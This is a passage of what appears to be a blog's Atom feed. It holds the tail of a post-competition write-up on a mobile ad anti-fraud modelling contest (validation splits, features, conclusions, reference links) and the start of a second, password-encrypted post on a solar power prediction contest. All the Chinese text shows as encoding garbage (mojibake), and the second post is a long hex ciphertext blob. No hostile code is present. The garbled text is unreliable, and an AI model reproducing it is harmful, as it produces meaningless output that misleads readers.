href="https://www.logicjake.xyz/2020/02/06/%E7%A7%BB%E5%8A%A8%E5%B9%BF%E5%91%8A%E5%8F%8D%E6%AC%BA%E8%AF%88%E7%AE%97%E6%B3%95%E6%8C%91%E6%88%98%E8%B5%9B%E7%AE%97%E6%B3%95-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/">ÁßëÂ§ßËÆØÈ£ûÂèçÊ¨∫ËØà</a>‰∏≠ÁöÑÊìç‰ΩúÔºåÂØπÂÖ∂ËøõË°åÊï∞ÊçÆÂ§ÑÁêÜÔºå‰ΩÜÂèØËÉΩÁî±‰∫éËá™Ë∫´ÈáçË¶ÅÊÄßÂ∞±‰∏çÂ§ßÔºåÊï∞ÊçÆÂ§ÑÁêÜ‰πüÊ≤°Âï•Áî®„ÄÇÂÄüÂä©ÁôæÂ∫¶Âú∞Âõæ api ÂèØ‰ª•Â∞ÜÊï∞ÊçÆÈõÜ‰∏≠ÁöÑÁªèÁ∫¨Â∫¶ËΩ¨ÂåñÊàêÂÖ∑‰ΩìÁöÑÂüéÂ∏ÇÔºå‰πüÊ≤°Âï•ÊïàÊûú„ÄÇ</p><h2 id="Ê®°Âûã"><a href="#Ê®°Âûã" class="headerlink" title="Ê®°Âûã"></a>Ê®°Âûã</h2><p>ËøôÈ¢ò‰∏ªË¶ÅÊúâ‰∏§ÁßçÂª∫Ê®°ÊñπÂºèÔºå‰∏ÄÁßçÊòØÂ∏∏ËßÑÁöÑ‰∫îÊäò‰∫§ÂèâÈ™åËØÅÔºåÂú®ÂàíÂàÜÊØèÊäòÊï∞ÊçÆÊó∂ÔºåÊåâ day ÊâÄÂç†ÊØî‰æãÂàíÂàÜÊØî‰ª•ÊòØÂê¶ÁÇπÂáªÊØî‰æãÂàíÂàÜË¶ÅÂ•ΩÔºåÂèØ‰ª•ËÆ©ÊØèÊäòÊ®°ÂûãÂ≠¶‰π†Âà∞‰∏âÂ§©ÁöÑÊï∞ÊçÆÔºåÂÅöÂà∞Êó∂Èó¥‰∏äÂêåÂàÜÂ∏É„ÄÇÂè¶‰∏ÄÁßçÊåâÊó∂Èó¥ÂàíÂàÜÔºåÁ∫ø‰∏ãÁî®8Ôºå9‰∏§Â§©ÁöÑÊï∞ÊçÆÂÅöËÆ≠ÁªÉÈõÜÔºå10Âè∑Êï∞ÊçÆÂÅöÈ™åËØÅÈõÜÔºå‰øùÁïôÊ®°ÂûãÁöÑÊúÄ‰ºòËø≠‰ª£Ê¨°Êï∞ÔºåÁÑ∂ÂêéÁ∫ø‰∏äÊ®°ÂûãÁî®ÂÆåÊï¥ÁöÑ‰∏âÂ§©Êï∞ÊçÆÈ¢ÑÊµãÊµãËØïÈõÜ„ÄÇÂØπÊØîÊù•ÁúãÔºåÁ¨¨‰∫åÁßçÈ™åËØÅÈõÜÂàíÂàÜÊñπÂºèÂíåÁ∫ø‰∏äÊõ¥‰∏∫Áõ∏‰ººÔºåÊâÄ‰ª•‰∏éÁ∫ø‰∏äÂàÜÊï∞ gap ËæÉÂ∞èÔºåËÆ≠ÁªÉÊó∂Èó¥‰πüÊõ¥Áü≠ÔºåÊâÄ‰ª•Êàë‰ª¨‰∏ªË¶Å‰ΩøÁî®Á¨¨‰∫åÁßçÂª∫Ê®°ÊñπÂºè„ÄÇ‰ΩÜÁ¨¨‰∏ÄÁßçÂèØ‰ª•ÂæóÂà∞ÂÖ®Êï∞ÊçÆÈõÜ‰∏äÁöÑÁÇπÂáªÊ¶ÇÁéáÔºåÂèØ‰ª•‰Ωú‰∏∫Êñ∞ÁöÑÁâπÂæÅÂä†Âà∞Êï∞ÊçÆÈõÜ‰∏≠ÔºåÂèØ‰ª•ÊèêÂçá0.002-0.003„ÄÇÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÂÅáÂ¶ÇÈááÁî®ËøôÁßçÊñπÂºèÈõÜÊàêÔºå‰∫îÊäòÊ®°ÂûãÁöÑÂ≠¶‰π†Áéá‰∏çËÉΩÂ§™Â∞èÔºåÂê¶ÂàôÊ®°ÂûãÊïàÊûúË∂≥Â§üÂ•ΩÂØºËá¥Ê¶ÇÁéáÂÄºÁâπÂæÅËøáÂº∫Ôºå‰ΩøÂæóÊó∂Èó¥ÂàíÂàÜÊ®°ÂûãÁõ¥Êé•ÊãüÂêàÊ¶ÇÁéáÂÄºÔºåËøáÊó©Êó©ÂÅúÔºåÊó†Ê≥ïÂ≠¶‰π†ÂÖ∂‰ªñÁâπÂæÅ„ÄÇ</p><h1 id="ÊÄªÁªì"><a href="#ÊÄªÁªì" class="headerlink" title="ÊÄªÁªì"></a>ÊÄªÁªì</h1><p>‰∏™‰∫∫ÊÑüËßâÔºåÂèóÈôê‰∫é APP ÁöÑÁî®Êà∑‰ΩìÈ™åÔºåÂçïÁ∫ØÁöÑÁî®Êà∑Â±ûÊÄßÂØπÈ¢ÑÊµã‰ΩúÁî®‰∏çÂ§ßÔºåËøô‰πüÊòØ‰∏∫‰ªÄ‰πà app Ë°®Âíå user Êó†Ê≥ïÊ≠£Á°ÆÊâìÂºÄÁöÑÂéüÂõ†„ÄÇÊâÄ‰ª•Êàë‰ª¨ÈúÄË¶Å‰ªéÁî®Êà∑ÁöÑË°å‰∏∫Êï∞ÊçÆÔºà‰πüÂ∞±ÊòØ train Ë°®ÔºâÊûÑÈÄ†ÁâπÂæÅÔºå‰ΩÜË°å‰∏∫Êï∞ÊçÆ‰∏≠‰πüÊúâÂ§ßÈáè‰∏çÂèØ‰ø°Êìç‰Ωú„ÄÇÊúâ‰∫õÁî®Êà∑‰∏∫‰∫ÜÂÆåÊàê APP ÁöÑ‰ªªÂä°ÊãøÂ•ñÂä±Ôºå‰ºöÈöèÊÑèÁÇπÂáªËßÇÁúãËßÜÈ¢ëÔºåËøôÈÉ®ÂàÜË°å‰∏∫ÂÆåÂÖ®ÈöèÊú∫ÔºåÊó†Ê≥ï‰ªé‰∏≠Ê≠£Á°ÆÊèêÁÇºÂá∫Áî®Êà∑ÁöÑÂÖ¥Ë∂£ÊâÄÂú®Ôºå‰πüÂ∞±ÂæàÈöæÂéªÈ¢ÑÊµãÊú™Êù•ÁöÑÁÇπÂáªË°å‰∏∫„ÄÇ‰ΩÜÁî®Êà∑ËßÇÁúãËßÜÈ¢ëÂêéÁöÑÊ®°ÂºèÊòØÂõ∫ÂÆöÁöÑÔºåËßÜÈ¢ëÁöÑÊí≠ÊîæÊó∂Èó¥ÊòØÂøÖÂÆöÊúâÁöÑÔºåÊâÄ‰ª• ts ÁöÑÊó∂Èó¥Â∑ÆÊòØÂèØ‰ø°ÁöÑ„ÄÇÁÇπÂáªËßÜÈ¢ëËØ¶ÊÉÖÈ°µÂá∫Áé∞ÁöÑÁõ∏ÂÖ≥ËßÜÈ¢ëÊé®Ëçê‰πüÊòØÂøÖÁÑ∂Â≠òÂú®ÁöÑÔºàËøôÊòØÊàëÁåúÊµãÁöÑÔºåÂèØËÉΩ‰∏çÊ≠£Á°ÆÔºâÔºåÊâÄ‰ª•‰∏ã‰∏ÄÊ¨°ËßÜÈ¢ëÊõùÂÖâÁöÑ pos ‰πüÊòØÂèØ‰ø°ÁöÑ„ÄÇÊâÄ‰ª•Ëøô‰∏ÄÈ¢òÂ∏∏ËßÑÁâπÂæÅÂπ≤‰∏çËøáÁ©øË∂äÁâπÂæÅÔºåÊó†Ê≥ïËøá‰∫é‰ø°‰ªªÁî®Êà∑Ë°å‰∏∫ÔºåÂè™ËÉΩ‰ø°‰ªªÊú∫Âô®Ë°å‰∏∫„ÄÇ</p><h1 id="ÂèÇËÄÉËµÑÊñô"><a href="#ÂèÇËÄÉËµÑÊñô" class="headerlink" title="ÂèÇËÄÉËµÑÊñô"></a>ÂèÇËÄÉËµÑÊñô</h1><p><a href="https://www.turingtopia.com/models/details/notebook/b698f36b82f846e087cc349f91d0eba0" target="_blank" rel="noopener">ÊØîËµõÂàùÊúü0.65ÂºÄÊ∫ê</a><br><a href="https://www.turingtopia.com/models/details/notebook/417565783ede4251a7ef268019355259" target="_blank" rel="noopener">Â§©ÊâçÂÑøÁ´•0.81È´òÂàÜÂºÄÊ∫ê</a><br><a href="https://www.turingtopia.com/models/details/notebook/d854d4fd5b4e401ca20e944c4b353cbd" target="_blank" rel="noopener">user Ë°®Â§ÑÁêÜÊñπÂºèÂºÄÊ∫ê</a><br><a href="https://www.bilibili.com/video/av78282108" target="_blank" rel="noopener">È∫ªÂ©ÜË±ÜËÖêËßÜÈ¢ëËÆ≤Ëß£</a></p>]]></content>
        <author>
            <name><![CDATA[LogicJake‚Äôs Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.logicjake.xyz/2020/02/07/%E5%9B%BD%E8%83%BD%E6%97%A5%E6%96%B0%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%89%E4%BC%8F%E5%8A%9F%E7%8E%87%E9%A2%84%E6%B5%8B%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/</id>
        <title><![CDATA[ÂõΩËÉΩÊó•Êñ∞Á¨¨‰∫åÂ±äÂÖâ‰ºèÂäüÁéáÈ¢ÑÊµãËµõ-ËµõÂêéÊÄªÁªì]]></title>
        <updated>2020-04-21T13:42:03+08:00</updated>
        <link href="https://www.logicjake.xyz/2020/02/07/%E5%9B%BD%E8%83%BD%E6%97%A5%E6%96%B0%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%89%E4%BC%8F%E5%8A%9F%E7%8E%87%E9%A2%84%E6%B5%8B%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"/>
        <content type="text/html" src="https://www.logicjake.xyz/2020/02/07/%E5%9B%BD%E8%83%BD%E6%97%A5%E6%96%B0%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%85%89%E4%BC%8F%E5%8A%9F%E7%8E%87%E9%A2%84%E6%B5%8B%E8%B5%9B-%E8%B5%9B%E5%90%8E%E6%80%BB%E7%BB%93/"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="ÂØÜÁ†ÅÈîôËØØ" data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">ËæìÂÖ•ÂØÜÁ†Å</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="9dd89417eb77692e7fd18886c7e9e4efa9435cddd62672584cfe786668a76610">e5eb025b9d453f6fe7ad941d9ee49e3724da413c36c94cb7ddb25597ce4317ee26b7155a25f84cc57e8914af67745b49ce9db3b35b4b9c02c7566164f1942a05fed6761b2ebabe974de19522e67a77de4245966c0f80ff66e73aaa9d44bed41f938a2552f1af2920c3b2754a2f7ab267230c10250ddbdadd01688dc846c27b852d4d1c60bd2058966e2d7193069e6d8ed27f00671cc24c6bf64d4b08c8d61a17cc2ee8a8a0c95adb0327d62aef0fb7135519155068f14883b2be19d8873c1de08f40d076987124e421e102efc053849cb4d77d4d46d37b97035406da6b585553b56dbea9943f744f333a83e981d8742eb54bd3c22af43926dc4ebc23dc3b39f5dadf2104fbe607cb7f78bb224adec9886368cf1e2891382d8c7231cf889387141cfe2b2af7a224114d7c24eca66eb64584b080050e3c7f76f5680b1c616dd507dd3472a83d593156aa3d32d4af97a04aac020cd14f21998e9a6a5383e882b44dfb58c5d1c035460bb77685871959d3e393a5bd2c8c81170e677f607794da8e77e6d275bcbe0d765ea24f53f93b1b2bcd62fe17b53bccd05402b2fb1344abb7fe3f0e5cff7fda297e85964109d67d5a459ef81d58053fba568bbfc546cfc0de68278ed31c53527bae03b57a3615692e1bd3735552e5292bafb3478a3cbe8e52ae0d4a384650b1059b49a13dbd48d63efe9d5253711e5cb2bd3fbfc940660d3091ce274e76ab5fbf1fea42ae90518be58aed20d5f4314f75261000cfdc4c31cecc8939890fa97e59150a0d9b08a593a15c44aa5a87b66a7c36c36cbab3cda356254d988746801d693e1e0cbf9edefb4865cabe6e139e654a916a2f6f0aa431f4adaf96913d5b1dbad60f0e8848e2462e440f472a2bf3a6f38b1def11636e1b774701b614c2a58e2ad6141a1de0a6308c043a82447c10f5950098a3dcd56994e568478c9bd8de986036bc7a593aa7e01f77441b49f4db1402ee1ad9d1b6e468cc740fd21b3ee25e8eb2de0c2ffd257f577625477ec4054b6aa8f3fa8d89e0443ce135d9e2da7968b08531914d27239333bc4849650df258da5cd726ac654b7ce68ccc754068dfa7e2b813ea976e03c0b31e83e62fb0d5e8c71db9f2a1a36f067921461ffd0d4347e99f3a050150a82959c3351caf1ddfe6c09909723fd6dfdaea76c5e8e12027cd731aa9369e808ac9f3d4031ea712f9bcbb19667ea2559e5eb13e97d96d7842fe25c2d130983cb1c90c2e184028234ec61b8318f9059f4c859f211e709187b5a5cfa5cb49a58cac19034f6117cf72c445c7cacfc9d67fd495ad7dc6745c072859d08c5fb11490fe1584fcdd58cf3f4bf5467fabca3922b783c9c4297aa381eaf8025fd29e2e5a2cd7c1dc29d54c479f5b3d501e730db8be09d57c084434aa3e7e4ba4a0db56df500538e7dd1c1db9cc1c166506adb78420d91af7a5c378cdca7573158292101bcfe5ed3ef2546421951eba41fa6ee0cf299d517ba5cd947167e6db65025d5d657b6d35fd825fda7701ca5b194ac6fb2430c4e361d93d0751250e37ae9ef9aa2c0bc04b9a15e107068b6da90fa62aa6b4bb1b03656c3336d5e3b288cb8f587d486ae7948d1e55da3e11420014aef05070903f3bba4493fa0c881ef59e262ba37e6d2aaacd08d10db590ae28b082341d4b2f1b9b78bcc56ec43a3b1855c092648c4f5705608249ded7b7f8c1284347add3f9c219e09798f2a5930fce82e86c087d4f859a6b2b87cb12b067a98436910f3e543b353b0080febdc9417e2d02280a62721b8459205600f1a2dc178c474aec5fb19e9f666795121668386e67142c5889a44a963d19b1b028ae2222a4ae7d08c53466521a45ace402b732b6e96121171f0cae37d50b1b775a2a647e2664976392096a588dd6acba61e659d34a25532cc0892498d6d9a7dc2328de76018406da0963c8a12df0c2658f56f36252e65f3c7a5110ad531e81b7686dc5f9ec0015672baca859ffe0b27965af7b4852b3ee9a6ab08970700c038e224a148a6a11bb7a337de2996729cbf80e40474e2334a7e9f2ec093472db464a1d2ca35356246e3af943830929c8534ffc694b8ccc3b0f5a24fa8bee3a9ff3b3e02762a60def05ba8896c44cc21b11dfe15e4ac5060dc04f4e95b0db2de3b14d985be2d6d2e4fcf1860dc5b431d045fe0dce5525436136e3239cd3e65cfb30efe3e1e49b2683e5ca62ce6d1117e39033a09c861ef9df3b61003925e80f4a5b02578be5919cfd51f2a95a8ddaf6a8c7e536c4379edd4e60c5bc31d958f6ec1047175766a3f6dd830e989cea1341350548f1fe9c3d29cd4b67cb3f2fe972f051cd7e9e2f6c477f9360ffa7eaf1b94f8eb0fd60a3675a948346417f17fc4093f43d5a56ad03905620150c381ebfb3688a1a8ac9714490f6cb56276f496b42834de86206d3a2ce450cc6cb4cddcf67ffb81238eebeaa59368ceedd64e2ff09d70271960c0b3d55235edba0b1799ad9f098c564414ea7ff98838391e8778697153cc9f50ffa0a9578bee04a8460035085dc26f2e1dbdb2b5d428d89cd59617d964f02b999c0f8a78151b7f8666556cc378e7d8004d68bdcf458632abb152f1b49f899bb1caf991b97abda281e61ef39809d4e74868e73accc24c282449f30c32eee042974d24207f187b8f98cf873dd886d42a5dafbe467baf45c62a8ba77aa6aac65bc9b994f414356b0bcf2a99db3f74d957c33aeb9dfc707e4ad3a484e908d9f2b234c197c6007e6b614d7251befe1641abc696a041b3656273974c0f5ecd13e9c4fafb832551ce4a91bc4ff31da775cb144fb17a6ee4d7b08d80354adcacc582963ee1531faca6e957fac1cfb110ca39e366f6e9e52c35866914d406e2b5cac8db252b77357e4a658c2960ba07e0fa80b92ad2078518cb959ef10ca491d5e8cf8ff6afac934754ec2dbc5746cd64593d717c5730700505554323a3d5ebaa57450cabe41ca55c75afb71d0de46b3bd4a1c31c78d912798df505b4fa61ab3dee12a2662340fbad9b9e824691a54a84870be247cd185f46aa925aa5df5b1f5a9b1b5276b804c78cb0ec81102556a0a9464b619c77a67b6146db7419c9de2a3d551654935ef8ecbbfbbd1773e92efc82bd3b9f4f2f9968219b0877e145816dfbde68801aebfae33f40e04c62fd59a25ef199f45b71584e40c6f93d8fc9e18d7fc184636d7f1840634829faf61599e3f92aaa611593613425cabd5cd514f08a5d314ac345014368e4ff9a61969dcea5207b6e26bfe545a03fc1f82748256c60630dccf1b501061a032cb801b52b1d57d107e5cb305dd379ad998b549b9802bed97afc3849a1cb2c2b3be84e886589c7d4ac2709c50336e4bedad8e0eede89bc0b7b50f67a05928d80dc1af1b25f9fb8621921a4b4c042beb00221cd18332e3a112a8ff4d196857d6416c531d2c1ba9392a28661e1a09f79811aefc8b5afbef2bb703cae3b34cf16bb48bc54b95ad08d699103a246b4fb22bb48a7c075b6c8fef5bb5882086b900624f034521ecf97d993127e42d56701d38d0a05d0f326d99be2720b7d79e1e46d4d21b995c5e0918bc2ebba4574db87b92bd3ed7a8f4c4312fef58a7d981c40f3fcf09f8fe3b04e865634453302f773bc3940548fa15f14cf3471a61f97f71c72cee61ae81140476c59a3ae3a8f6ee18ac3d39158077f90e61d5b4a2410151b9e18e49eaf0554c34046fdfb1f4f260766100ed39fa986eb938515e8f6e8ce374a2c2d1daf6bc6727afdb8b471ac32d1fd589b07955be2aa3507fa07b4d4e56bf3b0518d6c51a6d4fd456118726cc085fae2d216220d47d1d78350cac3f4ffdb2e155217a4e1c8d3cc3c281e5b9d4cc09e69d0e8f4d3ae09f22ef4db2644069516a3ba1e80c1abd9912203ffeb09fb87b82928a5adb3e61dca8cc8aa6077cf5283433babf62d8c792227ae4e0454527c3a20cbc7539c368d2c2800e9992eac89ad2fb78f651b1cd9c1b605b46663cd19587f89642c7d1577b9a84bd5045336ba4a241c4f81aa2c56cd13c0e95b949f1e8f171499eba618d74a5a9a77a82ed4cd9793c46eef5a0990d071f8e6eb79781f32f6154d34df9d73700d9418cf305dead5532ed9fe1898190b37ed0ab4b2e1e07bd373669e01ba9de0fcf4f4207b31fc8c2b32367305307c659413997eaaae3dd95a19bc38ecb7b3b2056b4f688b3354445e3c4545acdf7eba976b55b77dbf2ba2f4e307dedd5b152b87f4f7259963224b9d965abcd34a1aed0800e05eb23288c3347dac1d30d8eeb145ca2a9ae2098b6af7581c7160b50c28b7f90ecc96e1c69b74fa7d58a08851b7d17fdbce86185846991a1b3cb8294319f3a6a9a1ca033ec45a691f6a05608810b3eccb7a178928c3d717ba70f93e2a8d25cb4e8b9cdbb2effa4ac7d025bcf317dfddf9495bf9c7f124dc3b756a9bf083d1a6163292f56c08dc762baae11e962c0e3b8b8033c2fd96b4b4bbe017fa14e5299b334d09044136bae989a688dd73eddea15b1cd5f5959ab71d0663afe8632b2781003fdbeef5c78c4591af3a8aad6410011cc0270e913431675f1733469a9e2fddd4375764964719bcc8d805dd80098c214fd6b3686a5fc5d82d080f89e0815431ccff322f88b8fdca8f4d6ea6df8d0e831f3636f6b9053074f1e122eee04d565564d0b5ac3f48d690eb8b5bc6643be3aad0af56d9c48a0259a0b688ce4754649b09e862139debf011c82377a27d5250d2b6afd49663c87fb514d177372aee4762ce87f06e6b88840faa36312121765da76028e20011a064ebe7634b9fe5993935adf42329b3853284fd534d9089ee1b125688ac1bab595ef8ed9ca34be9a027264c092afb163b7e68736b0ad794cd7d43e12603ac5cecc6fce17117473895c2aa6636ad2c75f2f52c2f742efef52eccb286bf45b3caf4a43aa981949c38d96373008f8ce3705760a8b20f54c4962103b86a0dc8f3fffc57f4cc39f146513aa25a7223feefb4c5c3ae9fd0cbebb4d35b83d33ac687e3e0754f47583566f26f002496bae744457ebac7c39126c935378225a341454e34e44fdb3764658a44f4e2e0e2a6e304174bf307a909a27214fbad1c00049fae54a8de9a1855d84cb219247e32d4013552d2a1fae1fb1410e741d0cf8fe9d8ab12cdcda5587f7f57e98029139c52830e1fc2f9bb10441a87aeaadaf82fa7e05aef97b0991e6eccad20f3df1a06ec1db82e7d95e5d0842d33cfb4d9534ca19a77edc0621b9f84a42b2c50af685d44edac9658a753085652b4e08479f544ef51a45ca80af08787b20a0ff30bfa9049c4418f97a400b487d1554caaea1e6b05593dea394d5e8ee5c03dac0d941dc15101b3bd95f82af8d1203e9085e14feccecc193a2b4e1081a02d3a63cc8fc51b0e624d78e2c8040fc8f64fca269cf405526e0a4312fa94f54aba69bcea466026c5d6389dcde46da6f640cde148257bf96f6fd6826217a1edb6ba1ca8f35a27bc23d50d1bd7132666c4ec2267ad8814bd7e09bf3ffdeaca14b7d4396fc4cc94096192b9200d2ef704c9dd843ee60230c40bf3a7f2982b9a96ae2ec2d00191a991054c7a8920a3e01d868e5a3ae74593f6d4251cdea1f7f97d9d9d88f63b727586e860040dd09ab4e5ceb1a3870f54e5d883726af65e9d4341e9c287da590ed95749ad798ba224d020af5615679cd5a3926a7056f2b6f7dcf1e60e96ddb8f2f9b100067bff1bf2d184999cd5e0b38f9213eabac40902d75d250e39038816ddddfdef2758e8448837607dc3ef479256491af5a4f64d08c0a270f8e94856f38807460ea3872229acdf793b194a69530c9d3bf914a5f197cb8b163fc49d5492e581dacd5a949222eeae8a62afd87bf2588b2b661d7469a598e235545df6b8716dc4adc51368dac3afc26e49c15e42625cdd270c5f6c6db307db5884f02ab37a0d0e94a19bacf8c72b3a66819fab1440e2c64b2de7aaccc92bcbf5beeca330c6f450aa2bc9dd4a48a30d04a3817a38a897fc472608a59ab48eb0878cf9ee12dd0af4108656db6c67d697211bb9fc6c3a2cdd353635b34d0baa966b1ee1523c08bbcf41d0327a13372471c5f5d578016e7a6b41829955fe2b19f962a685b246d91243cfefc0c0a9b5ee49519b0fda8c126028d4baaf046f75c5a5d904a03d118a20f63ce17c617e156df0ca2837daae048e7a1b09ff5222fa7336414756bf7fa151f6323216b8de01b9d520d8924227d2d2916d2465ec789e1411bd666fd16d9676ca4c525e18120bff2341bbe2aae12811d73e546af021c3eb512d1899cb367502857174bb570d5c62929b0a2490d0d3968c11ca17b299abf267ba4247b30ec54d413d8bf63f59908e5408d7f8d669a7cca4772e331eed39bc8cc53cd1b24198fa04e801e056a3ab97e98349ee43aa774a5638bbc656ddc31a34dc6d1fc6d86d52525fce25e3f97c9403200dd433b83adf038b3d9bcfafb1fa2bb6c1d8a6919ea8873e0a8de83de87c2c125b17b5d2e3c955997bd81b45a29e89f2d37b5560f47b664379938056f45b22bc5f587d4933c6a2dfe33b7f8cfb18f08b33fbfa08ac51da5f5362050899b7647a5cc039b0bc3db90a8c722ceeb72b038302ef88102d4fa5f2a03c030917b5006a77e55cb64cb219d174eb344030fc9ef344e855a075fe24807faad05f144195f9cb2dfcbd81e9d6fb0f7f18177e7e46db14bfdb1820413c72388881974bb1284965951f37f91e6ae3ac837c6f78d5c173f9ab54b4c67f6b1fe841fc001d6746d209a659787d8bb6f127a822e3d4d8b2bc36e2a7b800d5169c0c467e36df038185dae2f9191baccc4e90a9ce57d4e12e067ccabc090726a460269014b13ed30a9dc30b3f41182887fc6d083db4750203d09ef508b361cd6708475cb0d82df9e275614214fd9020d6dad6ed4ef9a8c16695797838a16785e2b33abf5133c9384fa2f248074f7e6996f9a7a2b8402f81e1d312125c08d0e9dace40ccb2b2875ba2f040c9a6988f07182ad036c4a82e99070b606e256338495d81b87e90999ea668187cb3746b47c6569936f2daf2701f4e62fe79442412ab0a6f31bf3a0b90c2fd144b03b89dcdc7f5fc0a8036318c20a68c8c1b55314dcb8447141c233017885eb0117546fbbb794dcb5c5bc0521042747c113b7e88acd29b7a25fa3b4fb30c734056ba3570e706bd6611e6ef4ed1f17930ee40c38078b376ac3d182e4a38fba06e5cf604c69d47c7224ef65e7cd8e8b17aca044efde7d873d234525adbb17e394039d5d8bbce42578812a81941fe05e94bc228fd13230642e90458b88a66302ed7d24a67c58e900bb16bc2c3d3fcdc2bde46bf55c25b07cf69057ba48a0313ed4dc5f3e71f0c74aadb89faf6e4a464262913ecfbb61ee974796fa2ed6c736d4a48b573e7a51f02e380df6dc9341d93de7beaef7d5c11b94180ba3933eba357230e11e0141c10bdb93e39a100a207cf437fcd3a01fca80ff3b1a00f2ff91dde95e667240dcccd76d768a587bcc1c61de263414571e85e5c84d41ca1dcca5223cae13cee20af00c21579e8832977c48692cd917a004b28911d820bfc43a0365b048d5a480095bb5c10ed1f613cd4ac81784f150617f488ef39260de0a2c9a1dfdf3f050458364cf6af304862bfe7bc15b4bcd084ffecd9a657291d936224cc6062cd167a955795bbc75f1c2b570befed33b4ded7654e45ff2fb847e1fe7b4b20602317e0adcb3ee7298d36626432a212e07d4ec82af5bd84487cc991085781b987b19d9c143a03d5f2c30bb4c6a295c3a81e8b0a456e77b565fdd0f2becc1a6fdefc541b2c807b2de4057883fd3001a60335704b504ef5043656c208e79bd08577ff5f1e7239a75ac1e72983f2e4d4de377832f1af17e4d25bedddb7fd8dc20c837da4d7d70903b94d9adf015f130b50dc84baa88119b2a8559920562315b7bceb65d467d1a15f56216e26f107bc8b19cad33c0c6ca1db8b1b11a0f431d78b0fcfcb26524ffc296aab5fb456f2410aa44cc9a162edffc314d935af612b015d3fdd7f0190a2509ef884f71e5caf7eb49c6a737273eac8f32707b51f92bcb4647ee63529e5f7dfae21c2b4695cb99fcc5956b53c19c0dcfb9d77494a7d743caae1b0435419126280e3d282e819726927e58533aaabcd3e1bcba20c4c78432c47d582cb655a932562f96e77c47773e2c5abdf4964c1011cdbae436b6a4bc39290eeb42bfc3b5de2f5397499f08dfbb314451e058bffef9c1cef277d6b2818b7a82fcb55b2344f4f23870e5c1fbdec7a26c7120cecd60d246a199cb81fa12f4404f095a434eadcbc185dfae6ee9f5a29f8b30ca2fb2068522c6e64751465f95e865bef47bb3f2fbd1198e703319818593140af9ad1cb8e092a2e10769235be7aba087882f68eeff1ceeaed7e4aeef5bad0d628e45ae64e8d37d8a727b4e24c26f880949df8c6171fc92077a33b490062981dd3ee4b5fc2115a49f7987b433d4829034d2f2f8cc37fabfc4491befef6572b0be572d70e2ac3465c46eac6c42056b6a51c07063c7d9970069dc4e5e37fa5907ee42a2fd192c0e1f4c932642c71c04c1968eb397af3e69f9ed4690bad39d06f3a89d87514e7aca1c5c2028e6213c0d0879a43294ef3a4e98897f7c388720a3e8fa746e598f44a496b9f2de7efcb992243d6fc578c2b95dc3f6769fe0d6a1520e819fa49be59e2a2b50f86c17c5c79f2282e5154d4e227e267b16e5c9110a3f870af0e6b4e19a98ed8f867ab2e9b789bc403a5b8c4c899f0336194f9d4168b224bc13e5513c0a4c1722109b83109dfea2482146fbdd04be6d77ba40e7217e0bed4ec3de96d9b41f07ef13a08b115f6b780992eb1a79674cf19a23248cb7cdcd3623c91f1e29df4a7f48c3f564dde7484741488d8bcc112afb565f5c807e79b0a9d82c3873e4222d73a1095f385205b6ef20c23873ec02b09e6d663e62e9735b9653c277233d9e336e6559c406314d2e2c241ce047378fc90f39e4f132c459f088f3433c2b892bbbdbf3a055bc06136a799b218fb3d61f4d2843a5ccd7c97b068d4c2173748440a3c1ba4494fc99dd665f23e7f002aac3aa26049fb4b2e151aa8e72d65377aa90e17c5020ecd96674b43c9ddfbe9bbe1057f6577907aa86b793294491d59fabed1b1160c76fc20cd4d9b155cdf935be8bbbc98eb75f89050fb504cbd60985c46383bff07bca420c19e5f3b3ae535cf7c3864fa22168a877372c46d668e247ba4a801ba763172a9809f6b4bc9fe8c2fcf6d1737ebc41310cfdb598bac1105315c4ba4c456d08e0d635c438da338d67d8249e2f5056088a6724e5ac887308b6402a060bc8c5f821df2d3437a6b999aca4a82d7366d299c3701c6254a62c86dcc56f3372cc38a3f543f83153aa5fafe681d94d5ecbe7ef305faf750443be8fc12f1be64af4b15ef647e9ecf57822414832eca378bff8a88d3736645cd5b7daa72a39e42ae876fa779751711a33b2ab82f61a14d29341df3565dd634d7372fc285c9805f4603813b9b212a2fe4aac7f21b341d721b56eff2ecbf7a051c0e8ccc6e6294ce4cc2de992e174cc62ebb4bce1c630acb692dfdf938270ad7b94c8fa24fac2cfd57e39274af3a3183aadfbb4c57441611a419543d9f47c301cd8383b7bc4ee171b54306966aab037b2331872220ef3c1d592816fb216751b1b41e07cf12186735e8462966c32edd4851a6bc92f536fd3ff99340aada312c9900b3f93405a073aaa539833a3d9c86db4615525a20d0abd548730deb664d342111b2b24c8242d525ca154e59c1bbade369c208e8fd740899e4f1fc929e592b1c4025f94428da58642e107970143c19036492dc790d175c5ffb3b08b874b26e3c9ff75278b5dd910cb8c133951ca5f96156666530a4c26ebed263fbda8d7e0f46c073e2c19a27d91c583025e7859175286f2b762140bcf4a8f463436e86bb06a1e8238a7a9e8a3b4ce241e4b859765478fcaeb4f78292798238ca8a4679eb5792bc22792797d0ade67fef0a10ae2da86d75d88dcdc81df5152eb932bd1de02b79e767b7b3bfebcbd9a36a537d526fb9219eb4ad793de76cabac38bab53ed6170e2b0240e69a7c84d561a5029a4a2534f27dc7dd4ef0614d26385ff2858931888b242a8ff37521c413b320b7a1547384e8908fc35f3108f90df65db385091b0587c0940b3a0a6e40a1e080e888e9566af0ec7476d9e5d1d9c6648b189e057a4c5ce369162acf30aa39833d356561e4139dfcf3bec6759ccce2b7d9bfd1f60f451be25f358610c9ef0713d5f48931a82b3ba08f516400e837ede5e08a968ecd473e772e3b26196912dfea81d19f773a0a71f0a98b61421006b52236256ad851517b1045e6128d97cbe4c1ae72bdc256d8d321caad0de2063134b7fb9d479b00a00b15fb6fbe5d8c02c305473d74a3c19cb482ecdf7966ab327b74c0ecb62d324083164c399f7297374c8cd2aa1b42b581ef88a2bd4f8574e16703d758a6ad54a2db6f77b7e30cca2b2f27fe12a3e685ec7770c9fb6aa021d2e9206ab22bdd4c7fef8da5f4be7bdcfb7b